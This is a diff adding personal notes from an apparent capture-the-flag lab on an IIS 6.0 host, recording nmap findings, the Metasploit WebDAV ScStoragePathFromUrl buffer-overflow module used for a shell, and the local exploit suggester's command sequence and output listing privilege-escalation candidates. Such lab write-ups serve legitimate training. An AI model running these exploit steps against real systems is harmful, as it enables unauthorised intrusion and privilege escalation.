@@ -1,0 +1,60 @@
+#####################
+# Sources and Links #
+#####################
+Using Metasploit's local exploit suggestor:
+https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/
+#########
+# TL,DR #
+#########
+
+########
+# Hack #
+########
+nmap shows port 80.
+Microsoft IIS httpd 6.0
+
+10.10.10.14/images shows:
+Directory Listing Denied
+This Virtual Directory does not allow contents to be listed.
+
+There is a metasploit module for IIS httpd 6.0 that grants a shell
+Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) 
+
+There are users Harry and Administrator, and access is denied to both.
+A folder called All Users has Security Configuration Wizard.lnk on the desktop.
+
+Let's use metasploit's exploit suggestor. 
+
+Background the process with ctrl-z.
+ctrl-z out of the 'meterpreter' prompt if needed.
+List/view sessions with 'sessions'
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...
+[*] 10.10.10.14 - 29 exploit checks are being tried...
+[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+
+
+###########
+# Learned #
+###########
+Using Metasploit's local exploit suggestor
+
+/Background the process with ctrl-z.
+ctrl-z out of the 'meterpreter' prompt if needed.
+List/view sessions with 'sessions'
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
